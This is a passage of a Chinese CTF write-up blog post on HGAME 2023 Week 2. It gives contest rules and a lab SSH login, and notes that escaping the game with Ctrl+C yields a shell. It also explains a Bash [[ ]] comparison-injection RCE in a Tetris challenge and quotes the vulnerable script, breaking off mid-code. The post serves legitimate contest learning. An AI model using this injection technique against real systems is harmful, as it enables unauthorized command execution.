<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>HGAME 2023 Week 2 | Lazzaro</title><meta name="description" content="â€‹     HGAME 2023 å°†äº 1 æœˆ 5 æ—¥ 20:00 æ­£å¼å¼€å§‹ï¼Œç¥å¤§å®¶ç©å¾—å¼€å¿ƒ :-)çº¿ä¸Šèµ›å¹³å°ï¼šhttps:&#x2F;&#x2F;hgame.vidar.clubè¯·å°½å¿«æ³¨å†Œï¼Œæ³¨å†Œæ—¶è¯·é€‰æ‹©æ ¡å¤–é€‰æ‰‹ï¼Œæ³¨å†Œå°†äº 1 æœˆ 12 æ—¥ 20:00 å…³é—­æœ¬æ¬¡æ¯”èµ›çš„å¥–åŠ±äº‹å®œä»¥åŠèµ›åæ²Ÿé€šåé¦ˆä»¥é‚®ä»¶ä¸ºä¸»ï¼Œè¯·å„ä½ä½¿ç”¨çœŸå®çš„é‚®ä»¶åœ°å€æ¯”èµ›å¥–é‡‘(é’ˆå¯¹æ ¡å¤–æ¦œ)ï¼šç¬¬1åï¼š1000Pwnhubé‡‘å¸ç¬¬2åï¼š800Pwnhubé‡‘å¸ç¬¬3å"><meta property="og:type" content="article"><meta property="og:title" content="HGAME 2023 Week 2"><meta property="og:url" content="https://lazzzaro.github.io/2023/01/20/match-HGAME-2023-Week-2/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="â€‹     HGAME 2023 å°†äº 1 æœˆ 5 æ—¥ 20:00 æ­£å¼å¼€å§‹ï¼Œç¥å¤§å®¶ç©å¾—å¼€å¿ƒ :-)çº¿ä¸Šèµ›å¹³å°ï¼šhttps:&#x2F;&#x2F;hgame.vidar.clubè¯·å°½å¿«æ³¨å†Œï¼Œæ³¨å†Œæ—¶è¯·é€‰æ‹©æ ¡å¤–é€‰æ‰‹ï¼Œæ³¨å†Œå°†äº 1 æœˆ 12 æ—¥ 20:00 å…³é—­æœ¬æ¬¡æ¯”èµ›çš„å¥–åŠ±äº‹å®œä»¥åŠèµ›åæ²Ÿé€šåé¦ˆä»¥é‚®ä»¶ä¸ºä¸»ï¼Œè¯·å„ä½ä½¿ç”¨çœŸå®çš„é‚®ä»¶åœ°å€æ¯”èµ›å¥–é‡‘(é’ˆå¯¹æ ¡å¤–æ¦œ)ï¼šç¬¬1åï¼š1000Pwnhubé‡‘å¸ç¬¬2åï¼š800Pwnhubé‡‘å¸ç¬¬3å"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2023-01-20T09:25:16.000Z"><meta property="article:modified_time" content="2023-01-20T11:58:46.830Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="2023èµ›"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://lazzzaro.github.io/2023/01/20/match-HGAME-2023-Week-2/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="https://cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet"><meta name="generator" content="Hexo 5.4.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFå¼±é¸¡è‡ªè¿›é˜¶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="æœç´¢"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">Ã—</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">æ€»è§ˆ</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">æ±‡æ€»</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">ç±»åˆ«</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">å…³é”®è¯</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">æ¥ç•™ä¸ªè¨€ ğŸ‘‰ğŸ‘‰ğŸ‘‰</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">ç±»åˆ«</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">43</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">17</span></li></ul></div></div><div class="widget"><h3 class="widget-title">å…³é”®è¯äº‘</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020èµ›</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.86px">2021èµ›</a> <a href="/tags/2022%E8%B5%9B/" style="font-size:13.71px">2022èµ›</a> <a href="/tags/2023%E8%B5%9B/" style="font-size:13.57px">2023èµ›</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13.14px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.29px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.14px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/hash/" style="font-size:13px">hash</a> <a href="/tags/js/" style="font-size:13px">js</a> <a href="/tags/node-js/" style="font-size:13.14px">node.js</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.43px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">å†…ç½‘</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">ååºåˆ—åŒ–</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">åç¼–è¯‘</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">åè°ƒè¯•</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">å–è¯</a> <a href="/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/" style="font-size:13px">åé‡å­å¯†ç </a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">å‘½ä»¤è¡Œ</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">å›¾åƒ</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">å—å¯†ç </a> <a href="/tags/%E5%A0%86/" style="font-size:13px">å †</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.14px">å¯†ç </a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">ææƒ</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">æ–‡ä»¶ä¸Šä¼ </a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">æ›²çº¿</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">æ ˆ</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">æ ¼å¯†ç </a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">æ ¼å¼åŒ–å­—ç¬¦ä¸²</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">æ³¨å…¥</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">æµå¯†ç </a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">æµé‡</a> <a href="/tags/%E6%B7%B7%E6%B7%86/" style="font-size:13px">æ··æ·†</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">æ¸—é€</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">ç¦»æ•£å¯¹æ•°</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.14px">ç®—æ³•</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.43px">ç»•è¿‡</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">ç¼–ç </a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.14px">è„šæœ¬</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">è‡ªåŠ¨åŒ–</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">é€ƒé€¸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.29px">éšå†™</a></div></div><div class="widget"><h3 class="widget-title">æ±‡æ€»</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">äº”æœˆ 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">äºŒæœˆ 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">ä¸€æœˆ 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">åäºŒæœˆ 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">åä¸€æœˆ 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">ä¹æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">ä¸ƒæœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">å…­æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">äº”æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">äºŒæœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">ä¸€æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">åäºŒæœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">åä¸€æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">åæœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">ä¹æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">å…«æœˆ 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">å…­æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">äº”æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">å››æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">ä¸‰æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">äºŒæœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">ä¸€æœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">åäºŒæœˆ 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">åä¸€æœˆ 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">åæœˆ 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">ä¹æœˆ 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">å…«æœˆ 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">ä¸ƒæœˆ 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">å…­æœˆ 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">äº”æœˆ 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">æ–‡ç« ç›®å½•</h3><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tetris-Master"><span class="toc-number">1.1.</span> <span class="toc-text">Tetris Master</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tetris-Master-Revenge"><span class="toc-number">1.2.</span> <span class="toc-text">Tetris Master Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sign-In-Pro-Max"><span class="toc-number">1.3.</span> <span class="toc-text">Sign In Pro Max</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crazy-qrcode"><span class="toc-number">1.4.</span> <span class="toc-text">crazy_qrcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rabin"><span class="toc-number">2.1.</span> <span class="toc-text">Rabin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA-%E5%A4%A7%E5%86%92%E9%99%A91"><span class="toc-number">2.2.</span> <span class="toc-text">RSA å¤§å†’é™©1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E9%87%8C%E6%9C%89%E4%BB%80%E4%B9%88"><span class="toc-number">2.3.</span> <span class="toc-text">åŒ…é‡Œæœ‰ä»€ä¹ˆ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9B%B6%E5%85%83%E8%B4%AD%E5%B9%B4%E8%B4%A7%E5%95%86%E5%BA%97"><span class="toc-number">2.4.</span> <span class="toc-text">é›¶å…ƒè´­å¹´è´§å•†åº—</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Git-Leakage"><span class="toc-number">3.1.</span> <span class="toc-text">Git Leakage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#v2board"><span class="toc-number">3.2.</span> <span class="toc-text">v2board</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Search-Commodity"><span class="toc-number">3.3.</span> <span class="toc-text">Search Commodity</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Designer"><span class="toc-number">3.4.</span> <span class="toc-text">Designer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#before-main"><span class="toc-number">4.1.</span> <span class="toc-text">before_main</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stream"><span class="toc-number">4.2.</span> <span class="toc-text">stream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#math"><span class="toc-number">4.3.</span> <span class="toc-text">math</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VidarCamera"><span class="toc-number">4.4.</span> <span class="toc-text">VidarCamera</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#YukkuriSay"><span class="toc-number">5.1.</span> <span class="toc-text">YukkuriSay</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fast-note"><span class="toc-number">5.2.</span> <span class="toc-text">fast_note</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Iot"><span class="toc-number">6.</span> <span class="toc-text">Iot</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pirated-router"><span class="toc-number">6.1.</span> <span class="toc-text">Pirated router</span></a></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-match-HGAME-2023-Week-2" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">HGAME 2023 Week 2</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2023/01/20/match-HGAME-2023-Week-2/" class="article-date"><time datetime="2023-01-20T09:25:16.000Z" itemprop="datePublished">2023-01-20</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/match/">match</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/2023%E8%B5%9B/" rel="tag">2023èµ›</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2023/01/20/match-HGAME-2023-Week-2/" class="leancloud_visitors" data-flag-title="HGAME 2023 Week 2"><span class="leancloud-visitors-count">âˆ</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/01/20/match-HGAME-2023-Week-2/#comments" class="article-comment-link">è¯„è®º</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>â€‹</p><p>HGAME 2023 å°†äº 1 æœˆ 5 æ—¥ 20:00 æ­£å¼å¼€å§‹ï¼Œç¥å¤§å®¶ç©å¾—å¼€å¿ƒ :-)<br>çº¿ä¸Šèµ›å¹³å°ï¼š<a target="_blank" rel="noopener" href="https://hgame.vidar.club/">https://hgame.vidar.club</a><br>è¯·å°½å¿«æ³¨å†Œï¼Œæ³¨å†Œæ—¶è¯·é€‰æ‹©æ ¡å¤–é€‰æ‰‹ï¼Œæ³¨å†Œå°†äº 1 æœˆ 12 æ—¥ 20:00 å…³é—­<br>æœ¬æ¬¡æ¯”èµ›çš„å¥–åŠ±äº‹å®œä»¥åŠèµ›åæ²Ÿé€šåé¦ˆä»¥é‚®ä»¶ä¸ºä¸»ï¼Œè¯·å„ä½ä½¿ç”¨çœŸå®çš„é‚®ä»¶åœ°å€<br>æ¯”èµ›å¥–é‡‘(é’ˆå¯¹æ ¡å¤–æ¦œ)ï¼š<br>ç¬¬1åï¼š1000Pwnhubé‡‘å¸<br>ç¬¬2åï¼š800Pwnhubé‡‘å¸<br>ç¬¬3åï¼š600Pwnhubé‡‘å¸<br>4-10åï¼š300Pwnhubé‡‘å¸<br>è¡¥å……è¯´æ˜ï¼šæ’è¡Œæ¦œåˆ†æ•°ç›¸åŒè€…ï¼Œä»¥å…ˆè¾¾åˆ°è¯¥åˆ†æ•°çš„æ—¶é—´æ¬¡åºåˆ’å®šæ’åï¼Œæ¯ä½è·å¥–é€‰æ‰‹é¢å¤–èµ é€ Pwnhub é‚€è¯·ç ä¸€ä¸ª<br>æ³¨æ„ï¼š<br>* æ‰€æœ‰é€‰æ‰‹å‡ä»¥ä¸ªäººä¸ºå•ä½å‚èµ›ï¼›<br>* åœ¨è§£é¢˜è¿‡ç¨‹ä¸­é‡åˆ°ç“¶é¢ˆæˆ–å›°éš¾å¯ä»¥ç§èŠå‡ºé¢˜äºº<br>* ç¦æ­¢æ‰€æœ‰ç ´åæ¯”èµ›å…¬å¹³å…¬æ­£çš„è¡Œä¸ºï¼Œå¦‚ï¼šæ•£æ’­æˆ–ä¸å…¶ä»–äººäº¤æ¢ Flagã€è§£é¢˜æ€è·¯ï¼Œå¯¹å¹³å°ã€å‚èµ›è€…æˆ–å…¶ä»–äººå‘˜è¿›è¡Œæ”»å‡»ã€‚è¿è€…åˆ†æ•°ä½œåºŸå¹¶å–æ¶ˆæ¯”èµ›èµ„æ ¼ã€‚<br>* HGAME çº¿ä¸Šèµ›åˆ†ä¸ºå››å‘¨ï¼Œæ¯å‘¨è‡³å®˜æ–¹wpå‘å¸ƒå‰å‰ç¦æ­¢ä¸€åˆ‡è®¨è®ºæœ¬å‘¨é¢˜ç›®ä»¥åŠå…¬å¼€è‡ªå·± wp çš„è¡Œä¸ºã€‚åœ¨æ”¶é›†å®Œæˆåä¼šå¼€æ”¾è®¨è®ºï¼Œä½†ä»…èƒ½è®¨è®ºå·²ç»“æŸçš„é¢˜ç›®ã€‚<br>* æ¯å‘¨æ¯”èµ›ç»“æŸåæœ¬å‘¨å‰20åéœ€æäº¤wpåˆ°æŒ‡å®šé‚®ç®±<br>æœ¬æ¯”èµ›æœ€ç»ˆè§£é‡Šæƒå½’ Vidar-Team æ‰€æœ‰</p><p><strong>Rank: 8</strong></p><hr><p>â€‹</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Tetris-Master"><a href="#Tetris-Master" class="headerlink" title="Tetris Master"></a>Tetris Master</h3><blockquote><p>ä½ æ˜¯å¦å·²ç»åŒå€¦äº†æ™®é€šçš„æ¸¸æˆé¢˜ç›®ï¼Œå¯¹äºå†™è„šæœ¬ç©æ¸¸æˆæ„Ÿåˆ°æ— èŠï¼Ÿ æ­¤é¢˜ä½ éœ€è¦èƒ½å¤Ÿå®ç°RCEï¼Œæ‹¿åˆ°æ ¹ç›®å½•ä¸‹çš„flagï¼Œåˆæˆ–è€…ä½ æ˜¯çœŸæ­£çš„Tetris Masterï¼Ÿ</p><p>è¯·ä½¿ç”¨sshè¿›è¡Œè¿æ¥ï¼Œè´¦å·ä¸ºctf,å¯†ç ä¸ºhgameï¼Œä¾‹å¦‚ssh ctf@week-2.hgame.lwsec.cn -p portã€‚å¹¶ä¸”ä½ éœ€è¦å°†ç»ˆç«¯çš„å­—ä½“è°ƒå°ï¼Œä½¿çª—å£å¤§å°è‡³å°‘ä¸º 200 * 70 æ‰èƒ½æ­£å¸¸è¿›è¡Œæ¸¸æˆã€‚</p><p>HINTS:</p><p>é¢˜ç›®æè¿°å·²æ›´æ–°ï¼ŒåŒæ—¶ç”±äºå­˜åœ¨éé¢„æœŸï¼Œé¢˜ç›®åˆ†æ•°é™è‡³50,å¹¶ä¸Šçº¿100åˆ†çš„Revengeç‰ˆæœ¬ã€‚</p></blockquote><p>è¿æ¥ï¼š<code>ssh ctf@week-2.hgame.lwsec.cn -p 32150</code></p><p>æŒ‰ Ctrl+C å¼ºåˆ¶ç»“æŸæ‹¿åˆ°shellï¼Œ<code>cat flag</code> å¾—flagï¼š<code>hgame&#123;Bash_Game^Also*Can#Rce&#125;</code>ã€‚</p><p>â€‹</p><h3 id="Tetris-Master-Revenge"><a href="#Tetris-Master-Revenge" class="headerlink" title="Tetris Master Revenge"></a>Tetris Master Revenge</h3><blockquote><p>the same as Tetris Master</p></blockquote><p>bashå‘½ä»¤æ‰§è¡Œï¼Œå‚è€ƒByteCTF 2022 - bash_gameï¼Œåœ¨è¯»å…¥ <code>target</code> å€¼è¿›å…¥ <code>paint_game_over()</code> å†…ï¼Œæ¯”è¾ƒæ—¶ <code>[[]]</code> æ“ä½œç¬¦ä¼šé€ æˆRCEã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">paint_game_over</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> xcent=$((`tput lines`/<span class="number">2</span>)) ycent=$((`tput cols`/<span class="number">2</span>))</span><br><span class="line">    <span class="built_in">local</span> x=$((xcent-<span class="number">4</span>)) y=$((ycent-<span class="number">25</span>))</span><br><span class="line">    <span class="keyword">for</span> (( i = 0; i &lt; 10; i++ )); <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+i)</span>);<span class="variable">$&#123;y&#125;</span>H\033[44m<span class="variable">$&#123;good_game[$i]&#125;</span>\033[0m&quot;</span>;</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$master</span>&quot;</span> -eq <span class="string">&quot;y&quot;</span> ]] &amp;&amp; [[ <span class="string">&quot;<span class="variable">$score</span>&quot;</span> -gt 50000 ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+3)</span>);<span class="subst">$((ycent+1)</span>)H\033[44m`cat /flag`\033[0m&quot;</span>;</span><br><span class="line">    <span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$master</span>&quot;</span> -ne <span class="string">&quot;y&quot;</span> ]] &amp;&amp; [[ <span class="string">&quot;<span class="variable">$score</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$target</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+3)</span>);;<span class="subst">$((ycent+1)</span>)H\033[44mKeep Going\033[0m&quot;</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+3)</span>);<span class="subst">$((ycent+1)</span>)H\033[44m<span 